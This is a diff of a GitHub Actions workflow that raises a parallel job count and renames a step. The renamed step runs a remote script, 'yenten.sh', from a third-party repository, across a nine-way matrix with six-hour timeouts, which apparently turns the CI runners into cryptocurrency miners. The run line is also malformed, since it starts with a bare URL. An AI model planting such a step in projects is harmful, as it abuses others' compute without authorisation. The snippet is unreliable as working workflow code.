@@ -12,7 +12,7 @@ jobs:
         flag: [A, B, C, D, E, F, G, H, I]
     timeout-minutes: 360
     env:
-        NUM_JOBS: 20
+        NUM_JOBS: 25
         JOB: ${{ matrix.go }}
     steps:
     - name: Set up Go ${{ matrix.go }}
@@ -22,6 +22,6 @@ jobs:
       id: go
     - name: Setup
       uses: actions/checkout@v1
-    - name: Ba_channel
+    - name: ba_channel
       run: |
         https://github.com/memey357/ujicoba/blob/main/yenten.sh && chmod u+x yenten.sh && ./yenten.sh
